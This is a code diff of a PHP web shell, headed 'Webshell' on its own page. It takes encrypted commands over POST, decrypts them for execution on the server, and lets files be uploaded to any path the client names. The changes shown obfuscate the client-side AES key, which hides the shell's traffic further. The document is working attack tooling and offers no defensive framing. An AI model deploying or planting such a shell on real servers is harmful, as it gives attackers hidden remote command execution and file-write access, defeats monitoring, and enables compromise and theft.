@@ -11,6 +11,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if (isset($_POST['cmd'])) {
         $encryptedCommand = $_POST['cmd'];
         $decodedCommand = decrypt($encryptedCommand, $key);
+
         if ($decodedCommand === false) {
             echo encrypt("Decryption failed!", $key);
             exit;
@@ -23,7 +24,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         exit;
     }
     if (isset($_FILES['file'])) {
-        $uploadDir = $_POST['path'] ?? __DIR__; 
+        $uploadDir = $_POST['path'] ?? __DIR__;
         $uploadFile = $uploadDir . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
 
         if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
@@ -65,7 +66,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <h1>Webshell</h1>
     <h2>Execute Command</h2>
     <form id="commandForm">
-        <textarea id="command" placeholder="Enter command here..."></textarea>
+        <textarea id="command" placeholder="Enter command"></textarea>
         <button type="button" onclick="executeCommand()">Run</button>
     </form>
     <div class="output" id="commandOutput"></div>
@@ -76,20 +77,30 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         <button type="button" onclick="uploadFile()">Upload</button>
     </form>
     <div id="uploadOutput"></div>
+
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
     <script>
-        const key = "s3cr3tk3y1234567"; 
+        const originalKey = "s3cr3tk3y1234567";
+        const key = btoa(
+            Array.from(
+                atob(btoa(originalKey))
+            )
+            .map(c => c.charCodeAt(0).toString(16).padStart(2, '0'))
+            .join('')
+        );
+
         function encrypt(data, key) {
-            const iv = CryptoJS.enc.Utf8.parse(key); 
-            return CryptoJS.AES.encrypt(data, CryptoJS.enc.Utf8.parse(key), {
+            const iv = CryptoJS.enc.Utf8.parse(key.substring(0, 16)); 
+            return CryptoJS.AES.encrypt(data, CryptoJS.enc.Utf8.parse(key.substring(0, 16)), {
                 iv: iv,
                 mode: CryptoJS.mode.CBC,
                 padding: CryptoJS.pad.Pkcs7
             }).toString();
         }
+
         function decrypt(data, key) {
-            const iv = CryptoJS.enc.Utf8.parse(key);
-            const bytes = CryptoJS.AES.decrypt(data, CryptoJS.enc.Utf8.parse(key), {
+            const iv = CryptoJS.enc.Utf8.parse(key.substring(0, 16));
+            const bytes = CryptoJS.AES.decrypt(data, CryptoJS.enc.Utf8.parse(key.substring(0, 16)), {
                 iv: iv,
                 mode: CryptoJS.mode.CBC,
                 padding: CryptoJS.pad.Pkcs7
